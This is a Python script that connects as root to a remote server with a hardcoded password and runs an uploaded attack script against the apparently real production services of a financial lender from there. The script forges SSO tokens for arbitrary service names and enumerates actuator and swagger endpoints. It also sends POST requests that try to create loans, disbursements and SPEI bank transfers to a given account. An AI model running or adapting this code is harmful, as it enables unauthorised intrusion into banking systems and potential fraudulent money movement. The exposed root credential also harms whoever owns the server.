import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, base64
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

SSO_URL = "https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token"

def mint(app, svc):
    try:
        r = s.post(SSO_URL, json={"appJwt": app, "serviceName": svc},
            headers={"Content-Type": "application/json"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return data.get("token", "")
    except:
        pass
    return ""

def decode_jwt(tok):
    try:
        parts = tok.split(".")
        if len(parts) >= 2:
            pad = lambda ss: ss + "=" * (-len(ss) % 4)
            payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
            return payload
    except:
        return {}

# ========================================
# 1. ORCHESTRATOR DEEP — ALL METHODS
# ========================================
sys.stdout.write("=" * 60 + "\n=== ORCHESTRATOR-GESTIONA DEEP ===\n" + "=" * 60 + "\n\n")

ORCH = "https://orchestrator-gestiona-service-v2.tysonprod.com"

# Mint best token
tok = mint("TYSON-COBRANZA-GESTIONA", "orchestrator-gestiona-service-v2")
sys.stdout.write(f"Token payload: {json.dumps(decode_jwt(tok), indent=2)}\n\n")

hdrs = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}

# Extensive path list
orch_paths = [
    # Root / health
    "", "/", "/health", "/info", "/version",
    # Actuator
    "/actuator", "/actuator/health", "/actuator/info", "/actuator/env",
    "/actuator/mappings", "/actuator/beans", "/actuator/configprops",
    # Swagger
    "/swagger-ui/", "/swagger-ui.html", "/swagger-ui/index.html",
    "/v2/api-docs", "/v3/api-docs", "/openapi.json",
    "/swagger-resources", "/swagger-resources/configuration/ui",
    # V1 APIs
    "/v1/", "/v1/health",
    "/v1/applications", "/v1/loans", "/v1/credits",
    "/v1/disbursements", "/v1/dispersiones",
    "/v1/payments", "/v1/transfers",
    "/v1/spei", "/v1/stp", "/v1/clabe",
    "/v1/accounts", "/v1/clients", "/v1/customers",
    "/v1/products", "/v1/catalogs",
    "/v1/orchestrator", "/v1/process", "/v1/workflow",
    "/v1/steps", "/v1/journey",
    # V2 APIs
    "/v2/", "/v2/applications", "/v2/loans",
    # Gestiona specific
    "/v1/gestiona", "/v1/cobranza", "/v1/collection",
    "/v1/promesas", "/v1/promises",
    "/v1/visitas", "/v1/visits",
    "/v1/gestion", "/v1/estrategia",
    # Deep financial
    "/v1/transactions", "/v1/movements",
    "/v1/balances", "/v1/statements",
    "/v1/wire", "/v1/bank-transfer",
    # Common Spring
    "/error", "/favicon.ico",
]

for path in orch_paths:
    try:
        r = s.get(f"{ORCH}{path}", headers=hdrs, timeout=3, allow_redirects=False)
        if r.status_code == 200 and len(r.text) > 10:
            sys.stdout.write(f"*** [{r.status_code}] {path or '/'} ({len(r.text)}b)\n")
            sys.stdout.write(f"    {r.text[:1500]}\n\n")
        elif r.status_code in [301, 302, 308]:
            loc = r.headers.get("Location", "")
            sys.stdout.write(f"  [{r.status_code}] {path or '/'} -> {loc[:100]}\n")
        elif r.status_code in [405]:
            sys.stdout.write(f"  [{r.status_code}] GET {path} — try POST\n")
            # Try POST
            rp = s.post(f"{ORCH}{path}", headers=hdrs, json={}, timeout=3, allow_redirects=False)
            if rp.status_code == 200 and len(rp.text) > 10:
                sys.stdout.write(f"    POST [{rp.status_code}] ({len(rp.text)}b) {rp.text[:500]}\n")
            elif rp.status_code not in [404, 405]:
                sys.stdout.write(f"    POST [{rp.status_code}] ({len(rp.text)}b)\n")
        elif r.status_code in [403, 401]:
            sys.stdout.write(f"  [{r.status_code}] {path}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 2. BFF-ORIGINATION POST ENDPOINTS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== BFF-ORIGINATION POST ENDPOINTS ===\n" + "=" * 60 + "\n\n")

ORIG = "https://bff-origination-service.tysonprod.com"
tok2 = mint("FINDEP-GESTIONA", "bff-origination-service")
hdrs2 = {"Authorization": f"Bearer {tok2}", "Content-Type": "application/json"}

# Try POSTing to create-like endpoints
post_paths = [
    ("/v1/applications", {"amount": 1000, "term": 12}),
    ("/v1/loans", {"amount": 1000}),
    ("/v1/disbursements", {"loanId": "1", "amount": 1000}),
    ("/v1/dispersiones", {"creditoId": "1", "monto": 1000}),
    ("/v1/transfers", {"amount": 1000, "destination": "012180015000000001"}),
    ("/v1/spei", {"amount": 1000, "clabe": "012180015000000001"}),
    ("/v1/payments", {"amount": 1000}),
]

for path, body in post_paths:
    try:
        # GET first
        rg = s.get(f"{ORIG}{path}", headers=hdrs2, timeout=3, allow_redirects=False)
        if rg.status_code not in [404]:
            sys.stdout.write(f"  GET [{rg.status_code}] {path} ({len(rg.text)}b) {rg.text[:300]}\n")
        
        # POST
        rp = s.post(f"{ORIG}{path}", headers=hdrs2, json=body, timeout=3, allow_redirects=False)
        if rp.status_code not in [404]:
            sys.stdout.write(f"  POST [{rp.status_code}] {path} ({len(rp.text)}b) {rp.text[:300]}\n")
    except:
        pass
    sys.stdout.flush()

# Try actuator on origination
sys.stdout.write("\nActuator on origination:\n")
for ap in ["/actuator", "/actuator/health", "/actuator/info", "/actuator/env", "/actuator/mappings"]:
    try:
        r = s.get(f"{ORIG}{ap}", headers=hdrs2, timeout=3)
        if r.status_code == 200 and len(r.text) > 20:
            sys.stdout.write(f"  *** [{r.status_code}] {ap} ({len(r.text)}b)\n")
            sys.stdout.write(f"    {r.text[:2000]}\n\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 3. MORE TYSON SERVICES (BROAD SCAN)
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== BROAD TYSON SERVICE SCAN ===\n" + "=" * 60 + "\n\n")

# Generate more service names from context clues
more_services = [
    # From gestiona APK hints
    "bff-gestiona-service", "gestiona-service",
    "cobranza-service", "cobranza-gestiona-service",
    # From calidad-architect subdomains we found
    "bff-origination-service-v2",
    "dynamicjourney-orchestrator-v2",
    # Financial
    "stp-connector", "stp-proxy", "stp-gateway-service",
    "spei-connector", "spei-proxy", "spei-gateway-service",
    "banxico-service", "banxico-connector",
    "payment-gateway-service", "payment-processor",
    "disbursement-processor", "dispersion-processor",
    # Infrastructure
    "api-gateway", "gateway-service", "edge-service",
    "zuul-service", "spring-cloud-gateway",
    "config-server", "config-service",
    "admin-service", "admin-server",
    # More from loan lifecycle
    "underwriting-service", "scoring-service",
    "risk-service", "fraud-service",
    "identity-service", "kyc-service",
    "document-service", "documents-service",
    "signature-service", "firma-service",
    "notification-service", "email-service",
    "sms-service", "push-service",
    "report-service", "reporting-service",
    "reconciliation-service",
    "audit-service", "bitacora-service",
    "employee-service", "user-service",
    "branch-service", "sucursal-service",
]

alive_services = []
for svc in more_services:
    base = f"https://{svc}.tysonprod.com"
    try:
        tok_s = mint("TYSON-COBRANZA-GESTIONA", svc)
        r = s.get(f"{base}/", headers={"Authorization": f"Bearer {tok_s}"}, timeout=2)
        sys.stdout.write(f"  [{r.status_code}] {svc} ({len(r.text)}b) {r.text[:200]}\n")
        alive_services.append(svc)
        
        # If alive, check actuator
        r2 = s.get(f"{base}/actuator/mappings", headers={"Authorization": f"Bearer {tok_s}"}, timeout=2)
        if r2.status_code == 200 and len(r2.text) > 100:
            sys.stdout.write(f"  *** ACTUATOR MAPPINGS *** {svc} ({len(r2.text)}b)\n")
            sys.stdout.write(f"    {r2.text[:3000]}\n\n")
        
        r3 = s.get(f"{base}/v2/api-docs", headers={"Authorization": f"Bearer {tok_s}"}, timeout=2)
        if r3.status_code == 200 and len(r3.text) > 100:
            sys.stdout.write(f"  *** SWAGGER *** {svc} ({len(r3.text)}b)\n")
            sys.stdout.write(f"    {r3.text[:3000]}\n\n")
    except requests.exceptions.ConnectionError:
        pass
    except:
        pass
    sys.stdout.flush()

sys.stdout.write(f"\n\nALIVE SERVICES: {alive_services}\n")


# ========================================
# 4. SSO TOKEN MINT - SERVICE NAME ENUM  
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== SSO TOKEN ENUM — FIND ALL SERVICES ===\n" + "=" * 60 + "\n\n")

# The SSO minting returns a token with the service name in the "aud" claim
# Let's mint tokens for many names and see which ones succeed vs fail
test_names = [
    "spei", "stp", "payment", "transfer", "disbursement", "dispersion",
    "pago", "transferencia", "deposito", "retiro", "cobro",
    "accounting", "contabilidad", "tesoreria",
    "core", "core-banking", "banking",
    "findep-core", "fisa-core",
    "findep-spei", "findep-stp",
    "findep-payment", "findep-transfer",
    "aef-spei", "aef-payment", "aef-transfer",
]

for name in test_names:
    tok_test = mint("FINDEP-SPEI", name)
    if tok_test:
        payload = decode_jwt(tok_test)
        aud = payload.get("aud", "")
        sub = payload.get("sub", "")
        sys.stdout.write(f"  MINTED {name}: aud={aud} sub={sub}\n")
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/spei_orch.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/spei_orch.py 2>&1', timeout=600)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
